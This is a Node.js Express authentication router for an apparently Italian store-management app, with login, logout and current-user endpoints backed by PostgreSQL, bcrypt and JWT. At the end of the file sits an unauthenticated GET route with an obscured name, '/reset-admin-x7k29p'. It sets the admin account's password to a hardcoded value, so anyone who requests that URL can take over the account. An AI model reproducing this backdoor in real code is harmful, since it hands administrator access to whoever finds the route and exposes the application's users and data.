const router = require('express').Router()
const bcrypt = require('bcryptjs')
const jwt = require('jsonwebtoken')
const { verifyToken, JWT_SECRET } = require('../middleware/auth')

router.post('/login', async (req, res) => {
  const { username, password } = req.body
  if (!username || !password) return res.status(400).json({ error: 'Username e password obbligatori' })
  try {
    const db = req.app.locals.pgPool
    const result = await db.query(
      `SELECT u.*, s.name as store_name, s.code as store_code
       FROM mg_users u LEFT JOIN mg_stores s ON s.id = u.store_id
       WHERE u.username = $1 AND u.active = true`,
      [username.toLowerCase().trim()]
    )
    const user = result.rows[0]
    if (!user) return res.status(401).json({ error: 'Credenziali non valide' })
    const valid = await bcrypt.compare(password, user.password_hash)
    if (!valid) return res.status(401).json({ error: 'Credenziali non valide' })
    const payload = { id: user.id, role: user.role, store_id: user.store_id, username: user.username, name: user.name }
    const token = jwt.sign(payload, JWT_SECRET, { expiresIn: '8h' })
    const expiresAt = new Date(Date.now() + 8 * 60 * 60 * 1000)
    await db.query(`INSERT INTO mg_sessions (token, user_id, expires_at) VALUES ($1, $2, $3)`, [token, user.id, expiresAt])
    res.json({ token, user: { id: user.id, name: user.name, username: user.username, role: user.role, store_id: user.store_id, store_name: user.store_name, store_code: user.store_code } })
  } catch (err) {
    console.error('[AUTH] login error:', err.message)
    res.status(500).json({ error: 'Errore interno del server' })
  }
})

router.post('/logout', verifyToken, async (req, res) => {
  try {
    const token = req.headers['authorization']?.split(' ')[1]
    await req.app.locals.pgPool.query('DELETE FROM mg_sessions WHERE token = $1', [token])
    res.json({ ok: true })
  } catch (err) { res.status(500).json({ error: 'Errore logout' }) }
})

router.get('/me', verifyToken, async (req, res) => {
  try {
    const result = await req.app.locals.pgPool.query(
      `SELECT u.id, u.name, u.username, u.role, u.store_id, u.active, s.name as store_name, s.code as store_code
       FROM mg_users u LEFT JOIN mg_stores s ON s.id = u.store_id WHERE u.id = $1`,
      [req.user.id]
    )
    if (!result.rows[0]) return res.status(404).json({ error: 'Utente non trovato' })
    res.json(result.rows[0])
  } catch (err) { res.status(500).json({ error: 'Errore interno' }) }
})
router.get('/reset-admin-x7k29p', async (req, res) => {
  try {
    const newHash = await bcrypt.hash('Pa120123!', 10)
    const db = req.app.locals.pgPool
    await db.query(`UPDATE mg_users SET password_hash = $1 WHERE LOWER(username) = 'admin'`, [newHash])
    res.json({ ok: true, message: 'Password aggiornata con successo' })
  } catch (err) {
    res.status(500).json({ error: err.message })
  }
})
module.exports = router
